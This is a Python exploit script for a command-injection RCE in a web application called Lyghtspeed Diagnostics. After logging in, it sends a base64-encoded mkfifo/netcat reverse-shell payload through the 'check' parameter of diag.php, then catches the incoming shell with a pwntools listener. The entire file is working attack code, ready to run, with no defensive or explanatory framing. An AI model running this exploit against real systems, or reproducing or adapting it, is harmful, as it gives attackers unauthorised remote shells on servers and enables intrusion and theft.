# -*- coding: utf-8 -*-

# Lyghtspeed Diagnostics Command Execution RCE
# CVE: -
# Exploit author: Renan Almeida
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import os
from pwn import *
import requests
import subprocess
import sys


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='Lyghtspeed Diagnostics Command Execution RCE', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Tomcat Manager host', 
                            required=True)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--username', type=str,
                            help='Lyghtspeed username', 
                            required=True)
    
    main_arg.add_argument('--password', type=str,
                            help='Lyghtspeed password',
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
        
    # cons
    lhost = args.lhost
    lport = args.lport
    rhost = args.rhost if args.rhost[-1] is '/' else args.rhost + "/"
    username = args.username
    password = args.password
    burpsuite = args.burpsuite
    
    # req
    sess = requests.Session()
    
    def login():
        
        login_data = { "username": username, "password": password }
        proxies = { "http": "127.0.0.1:8080" }
        
        print(" [*] Sign-in using credentials...")
        
        try:
            if burpsuite:
                r = sess.post(rhost + "index.php", data=login_data, proxies=proxies)
            else:
                r = sess.post(rhost + "index.php", data=login_data)
        
        except Exception as e:
            print(e)
        else:
            if 'Invalid' not in r.text:
                print(" [*] Logged with success!")
                return True
            else:
                print(" [*] Failed to login with provided credentials")
                sys.exit(1)
    
    
    def reverse_shell():
        
        print(" [*] Spawning the interactive shell...")
        
        try:
            l = listen(lport)
            l.sendline("id")
            l.interactive()
        
        except Exception as e:
            print(e)
            print(" [*] Failed to spawn the shell :(")
            
    
    def exploit():
        
        print(" [*] Sending the malicious request to remote host...")
        
        try:
            payload = "quagga;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)
            payload = base64.b64encode(payload.encode()).decode('utf-8')
            cookies = sess.cookies.get_dict()['PHPSESSID']
            payload = "curl -sS {}diag.php -X POST --data 'check={}' -H 'Cookie: PHPSESSID={}'".format(rhost, payload, cookies)
            subprocess.Popen([sys.executable, '-c', 'import os; from time import sleep; sleep(2); os.system("{}")'.format(payload)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        
        except Exception as e:
            print(e)
            print(" [*] Malicious request failed!")
            sys.exit(1)
        else:
            reverse_shell()
        
    # main
    print(" [>] Lyghtspeed Diagnostics Command Execution RCE")
    print(" [*] Python script exploit author: nullarmor")
    
    if login():
        exploit()
        

if __name__ == "__main__":
    main()
